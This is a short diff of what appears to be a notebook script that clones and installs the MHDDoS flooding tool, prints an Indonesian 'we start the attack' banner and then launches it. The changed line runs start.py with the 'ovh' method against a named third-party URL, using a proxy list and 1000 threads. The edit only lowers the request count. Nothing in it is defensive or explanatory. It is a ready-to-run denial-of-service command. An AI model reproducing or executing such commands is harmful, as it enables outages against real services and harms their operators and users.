@@ -79,4 +79,4 @@ printf "\n$g$b    kita mulai penyerangan $endc$enda" >&2
 ! cd MHDDoS
 ! pip3 install -r requirements.txt
 ! python3 start.py
-! python3 start.py ovh https://beta.welovecloudflare.de 1 10000000000 proxy.txt 1000 8585
+! python3 start.py ovh https://beta.welovecloudflare.de 1 10000000 proxy.txt 1000 8585
